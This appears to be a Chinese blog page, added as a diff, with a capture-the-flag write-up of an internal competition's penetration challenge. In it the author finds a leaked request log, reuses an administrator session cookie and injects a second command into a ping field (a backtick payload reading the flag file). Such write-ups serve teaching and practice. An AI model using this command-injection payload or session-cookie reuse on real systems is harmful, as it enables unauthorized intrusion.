@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>小比赛wp | xjseck&#39;s Home</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="CTF,比赛," />
+  
+
+  <meta name="description" content="前言内部的比赛,也就是帮忙看看题,又是虚脱的一天,有机会希望被招安养老:),简单的记录一下吧 题解 内部比赛人数900多人,也是火热. 题目分析,每一个人的flag 文件是不一样的,这里应该是随机几个人的flag文件是相同的,也就是随机的几个人是一样的题目环境 提交别人的flag文件会被通报和查ip,哈哈 题目环境是docker 一键部署的,web题目都是默认配置有列目录漏洞orz 拿了一道的相对">
+<meta name="keywords" content="CTF,比赛">
+<meta property="og:type" content="article">
+<meta property="og:title" content="小比赛wp">
+<meta property="og:url" content="https://www.xjseck.com/2018/12/23/小比赛wp/index.html">
+<meta property="og:site_name" content="xjseck&#39;s Home">
+<meta property="og:description" content="前言内部的比赛,也就是帮忙看看题,又是虚脱的一天,有机会希望被招安养老:),简单的记录一下吧 题解 内部比赛人数900多人,也是火热. 题目分析,每一个人的flag 文件是不一样的,这里应该是随机几个人的flag文件是相同的,也就是随机的几个人是一样的题目环境 提交别人的flag文件会被通报和查ip,哈哈 题目环境是docker 一键部署的,web题目都是默认配置有列目录漏洞orz 拿了一道的相对">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://www.xjseck.com/2018/12/23/小比赛wp/shentou1.jpg">
+<meta property="og:image" content="https://www.xjseck.com/2018/12/23/小比赛wp/shentou2.jpg">
+<meta property="og:image" content="https://www.xjseck.com/2018/12/23/小比赛wp/shentou.png">
+<meta property="og:updated_time" content="2018-12-23T10:34:31.850Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="小比赛wp">
+<meta name="twitter:description" content="前言内部的比赛,也就是帮忙看看题,又是虚脱的一天,有机会希望被招安养老:),简单的记录一下吧 题解 内部比赛人数900多人,也是火热. 题目分析,每一个人的flag 文件是不一样的,这里应该是随机几个人的flag文件是相同的,也就是随机的几个人是一样的题目环境 提交别人的flag文件会被通报和查ip,哈哈 题目环境是docker 一键部署的,web题目都是默认配置有列目录漏洞orz 拿了一道的相对">
+<meta name="twitter:image" content="https://www.xjseck.com/2018/12/23/小比赛wp/shentou1.jpg">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">导航</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">导航</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="ROUND_RECT"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="ROUND_RECT"
+            href="/category/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            分类
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="ROUND_RECT"
+            href="/tag/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="ROUND_RECT"
+            href="/link/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="ROUND_RECT"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题解"><span class="toc-text">题解</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-小比赛wp" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">小比赛wp</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2018.12.23</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>xjseck</span>
+        </span>
+      
+
+      
+  <span class="article-category">
+    <i class="icon-list"></i>
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+  </span>
+
+
+
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+
+      
+        <i class="icon-comment"></i> 
+        <span class="ds-thread-count" data-thread-key="post-小比赛wp"><i class="fa fa-spinner fa-spin"></i></span> 条评论
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>内部的比赛,也就是帮忙看看题,又是虚脱的一天,有机会希望被招安养老:),简单的记录一下吧</p>
+<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><ul>
+<li>内部比赛人数900多人,也是火热.</li>
+<li>题目分析,每一个人的flag 文件是不一样的,这里应该是随机几个人的flag文件是相同的,也就是随机的几个人是一样的题目环境</li>
+<li>提交别人的flag文件会被通报和查ip,哈哈</li>
+<li>题目环境是docker 一键部署的,web题目都是默认配置有列目录漏洞orz</li>
+<li>拿了一道的相对较难的题目之一的一血,被北京那边的打电话了,不要泄题,omg</li>
+</ul>
+<hr>
+<p><strong>wp</strong><br><strong>[综合渗透]</strong><br>拿了一道一血的综合渗透题,内网电脑没有工具内伤,简单的测试了一下,一个简单的cms,外围的可用信息不多,也没有找到可用的信息,最后使用复制一个字典,bp工具简单的跑一下出现README.md,就贴一下能用得上的信息吧,网站的文件目录结构如下:<br>因为之前访问的web题目都是可以列目录的,挨个访问一下吧</p>
+<pre><code>assets/             contains assets definition
+commands/           contains console commands (controllers)
+config/             contains application configurations
+controllers/        contains Web controller classes
+mail/               contains view files for e-mails
+models/             contains model classes
+runtime/            contains files generated during runtime
+tests/              contains various tests for the basic application
+vendor/             contains dependent 3rd-party packages
+views/              contains view files for the Web application
+web/                contains the entry script and Web resources
+</code></pre><p>最后发现</p>
+<p><img src="shentou1.jpg" alt=""></p>
+<p>搜索一下<code>flag</code>关键信息如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER = [</span><br><span class="line">    &apos;HTTP_HOST&apos; =&gt; &apos;192.168.159.198&apos;</span><br><span class="line">    &apos;HTTP_CONNECTION&apos; =&gt; &apos;keep-alive&apos;</span><br><span class="line">    &apos;HTTP_UPGRADE_INSECURE_REQUESTS&apos; =&gt; &apos;1&apos;</span><br><span class="line">    &apos;HTTP_USER_AGENT&apos; =&gt; &apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36&apos;</span><br><span class="line">    &apos;HTTP_ACCEPT&apos; =&gt; &apos;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&apos;</span><br><span class="line">    &apos;HTTP_REFERER&apos; =&gt; &apos;http://192.168.159.198/web/index.php?r=upload%2Findex&amp;cmd=127.0.0.2%25ffcat++%2Fflag&amp;submit=%E5%8F%91%E9%80%81&apos;</span><br><span class="line">    &apos;HTTP_ACCEPT_ENCODING&apos; =&gt; &apos;gzip, deflate&apos;</span><br><span class="line">    &apos;HTTP_ACCEPT_LANGUAGE&apos; =&gt; &apos;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&apos;</span><br><span class="line">    &apos;HTTP_COOKIE&apos; =&gt; &apos;PHPSESSID=j5dmksk0q890qifkbbm5pt6s01; _csrf=uitUWyNkbS-0dWeRkLcxa1oDy2umSQ56; cib=a%3A3%3A%7Bs%3A2%3A%22id%22%3Bi%3A1%3Bs%3A4%3A%22name%22%3Bs%3A6%3A%22system%22%3Bs%3A4%3A%22sign%22%3Bs%3A32%3A%221966e92fca2cc5de6ba0a9f7b8d3b7c6%22%3B%7D&apos;</span><br><span class="line">    &apos;PATH&apos; =&gt; &apos;/sbin:/usr/sbin:/bin:/usr/bin&apos;</span><br><span class="line">    &apos;SERVER_SIGNATURE&apos; =&gt; &apos;&lt;address&gt;Apache/2.2.15 (CentOS) Server at 192.168.159.198 Port 80&lt;/address&gt;</span><br><span class="line">&apos;</span><br><span class="line">    &apos;SERVER_SOFTWARE&apos; =&gt; &apos;Apache/2.2.15 (CentOS)&apos;</span><br><span class="line">    &apos;SERVER_NAME&apos; =&gt; &apos;192.168.159.198&apos;</span><br><span class="line">    &apos;SERVER_ADDR&apos; =&gt; &apos;172.17.0.2&apos;</span><br><span class="line">    &apos;SERVER_PORT&apos; =&gt; &apos;80&apos;</span><br><span class="line">    &apos;REMOTE_ADDR&apos; =&gt; &apos;192.168.159.1&apos;</span><br><span class="line">    &apos;DOCUMENT_ROOT&apos; =&gt; &apos;/var/www/html&apos;</span><br><span class="line">    &apos;SERVER_ADMIN&apos; =&gt; &apos;root@localhost&apos;</span><br><span class="line">    &apos;SCRIPT_FILENAME&apos; =&gt; &apos;/var/www/html/web/index.php&apos;</span><br><span class="line">    &apos;REMOTE_PORT&apos; =&gt; &apos;13082&apos;</span><br><span class="line">    &apos;GATEWAY_INTERFACE&apos; =&gt; &apos;CGI/1.1&apos;</span><br><span class="line">    &apos;SERVER_PROTOCOL&apos; =&gt; &apos;HTTP/1.1&apos;</span><br><span class="line">    &apos;REQUEST_METHOD&apos; =&gt; &apos;GET&apos;</span><br><span class="line">    &apos;QUERY_STRING&apos; =&gt; &apos;r=upload%2Findex&amp;cmd=127.0.0.1%60tac+%2Ffla*%60&amp;submit=%E5%8F%91%E9%80%81&apos;</span><br><span class="line">    &apos;REQUEST_URI&apos; =&gt; &apos;/web/index.php?r=upload%2Findex&amp;cmd=127.0.0.1%60tac+%2Ffla*%60&amp;submit=%E5%8F%91%E9%80%81&apos;</span><br><span class="line">    &apos;SCRIPT_NAME&apos; =&gt; &apos;/web/index.php&apos;</span><br><span class="line">    &apos;PHP_SELF&apos; =&gt; &apos;/web/index.php&apos;</span><br><span class="line">    &apos;REQUEST_TIME_FLOAT&apos; =&gt; 1545042360.093</span><br><span class="line">    &apos;REQUEST_TIME&apos; =&gt; 1545042360</span><br></pre></td></tr></table></figure>
+<p>发现应该是管理员权限的一个命令执行漏洞,那就直接使用这里的cookie,访问<code>/index.php</code><br><img src="shentou2.jpg" alt=""><br>发现就是管理员了,然后尝试命令执行<br><code>/web/index.php?r=upload%2Findex&amp;cmd=127.0.0.1%60tac+%2Ffla*%60&amp;submit=%E5%8F%91%E9%80%81</code><br>发现是可以执行ping命令的,这里就构造一下使用log里面的payload,测试成功出来flag,一血拿到!</p>
+<p><img src="shentou.png" alt=""></p>
+
+    
+  </div>
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持作者</div>
+        <ul class="theme.donation.items.length">
+        
+          <li class="item">
+            <img src="/images/qr-wechat.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2018/09/28/Django学习笔记-五/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="hide pull-right" href="/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="ROUND_RECT"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="ROUND_RECT"
+              href="/category/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="ROUND_RECT"
+              href="/tag/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="ROUND_RECT"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="ROUND_RECT"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+  <section class="duoshuo-comments">
+    <!-- 多说评论框 start -->
+    <div class="ds-thread" data-thread-key="post-小比赛wp" 
+      data-title="小比赛wp" data-url="https://www.xjseck.com/2018/12/23/小比赛wp/index.html"></div>
+    <!-- 多说评论框 end -->
+  </section>
+
+
+
+
+  <script type="text/javascript">
+  var duoshuoQuery = {short_name:"forsigner"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0]
+     || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+  </script>
+
+
+    
+  <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
+<script>
+  var cloudTieConfig = {
+    url: document.location.href, 
+    sourceId: "",
+    productKey: "d16a7241e7cd4b389584ed8db2a4e8bc",
+    target: "cloud-tie-wrapper"
+  };
+</script>
+<script src="https://img1.ws.126.net/f2e/tie/yun/sdk/loader.js"></script>
+
+
+    
+
+	<hr />
+	<div id="hypercomments_widget"></div>
+	<script type="text/javascript">
+	_hcwp = window._hcwp || [];
+
+	_hcwp.push({widget:"Stream", widget_id: '89821'});
+
+	(function() {
+
+	if("HC_LOAD_INIT" in window) return;
+
+	HC_LOAD_INIT = true;
+
+	var lang = (navigator.language || navigator.systemLanguage || navigator.userLanguage || "en").substr(0, 2).toLowerCase();
+
+	var hcc = document.createElement("script"); 
+	hcc.type = "text/javascript"; 
+	hcc.async = true;
+	hcc.src = ("https:" == document.location.protocol ? "https" : "http")+"://w.hypercomments.com/widget/hc/"+'89821' +"/"+lang+"/widget.js";
+
+	var s = document.getElementsByTagName("script")[0];
+	s.parentNode.insertBefore(hcc, s.nextSibling);
+	})();
+
+	</script>
+
+	<a href="http://hypercomments.com" class="hc-link" title="comments widget">Powered by HyperComments</a>
+
+
+	
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
